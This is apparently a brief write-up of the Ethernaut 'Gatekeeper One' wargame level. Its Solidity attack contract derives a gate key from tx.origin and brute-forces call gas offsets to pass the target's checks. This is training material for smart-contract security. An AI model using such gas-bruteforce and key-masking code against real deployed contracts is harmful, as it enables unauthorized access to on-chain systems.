# Level 13: [Gatekeeper One](https://ethernaut.openzeppelin.com/level/0x2a2497aE349bCA901Fea458370Bd7dDa594D1D69)

## Level objectives:
1. Make it past the gatekeeper, and register as an entrant.

## Analysis (lol)
- Bitwise operations.
- Type conversion stuff.

## Steps:
```sol
//SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackGatekeeperOne {
    function attack(address _victim) public {
        bytes8 key = bytes8(0x1111111100001111) & bytes8(uint64(uint160(tx.origin)));

        for (uint i=0; i < 300; i++) {
            (bool success, ) = _victim.call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", key));
            if (success) break;
        }
    }
}
```
